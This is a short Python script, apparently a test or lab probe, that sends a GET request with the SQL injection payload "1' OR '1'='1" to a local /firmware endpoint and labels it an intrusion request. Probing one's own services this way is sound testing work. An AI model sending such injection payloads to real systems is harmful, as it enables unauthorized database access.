import requests

url = "http://127.0.0.1:5000/firmware?id=1' OR '1'='1"
try:
    r = requests.get(url, timeout=5)
    print("Intrusion request sent, status:", r.status_code)
except Exception as e:
    print("Error:", e)
